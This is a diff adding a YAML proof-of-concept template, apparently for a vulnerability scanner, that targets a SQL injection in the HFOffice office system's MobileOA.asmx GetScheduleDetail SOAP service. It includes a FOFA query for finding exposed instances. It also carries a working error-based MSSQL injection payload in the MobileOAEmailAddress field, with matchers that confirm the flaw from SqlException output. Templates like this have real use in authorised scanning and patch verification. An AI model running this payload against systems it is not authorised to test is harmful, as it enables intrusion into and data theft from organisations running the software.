@@ -1,0 +1,35 @@
+id: poc-yaml-hfoffice-getscheduledetail-sqli
+info:
+  name: 红帆HFOffice GetScheduleDetail SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: hfoffice
+  fofa: app="红帆-HFOffice"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ioffice/prg/set/wss/MobileOA.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetScheduleDetail
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetScheduleDetail xmlns=\"http://tempuri.org/\">\n    \
+    \  <MobileOAEmailAddress>' and 1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--</MobileOAEmailAddress>\n\
+    \      <iMsgSerID>string</iMsgSerID>\n    </GetScheduleDetail>\n  </soap:Body>\n\
+    </soap:Envelope>"
+  expression: 'status_code == 500 &&
+
+    contains(body,"0x" + t2)&&
+
+    contains(body,"转换成数据类型") &&
+
+    contains(body,"SqlException") &&
+
+    matches(content_type,"text/xml")
+
+    '
+transport: http
